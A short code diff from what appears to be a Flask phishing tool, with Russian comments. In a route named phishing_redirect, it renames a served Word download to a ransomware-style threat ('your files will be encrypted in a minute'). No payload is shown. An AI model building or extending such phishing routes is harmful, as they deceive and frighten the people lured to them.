@@ -77,7 +77,7 @@ def phishing_redirect():
         word_file = create_word_file()
 
         # Отправляем файл для скачивания
-        return send_file(word_file, as_attachment=True, download_name="поздравляю_лошара.docx", mimetype="application/vnd.openxmlformats-officedocument.wordprocessingml.document")
+        return send_file(word_file, as_attachment=True, download_name="ваши_файлы_будут_зашифрованы_через_минуту.docx", mimetype="application/vnd.openxmlformats-officedocument.wordprocessingml.document")
     except Exception as e:
         print(f"Ошибка при обработке запроса: {e}")
         return "Произошла ошибка на сервере. Пожалуйста, попробуйте позже.", 500
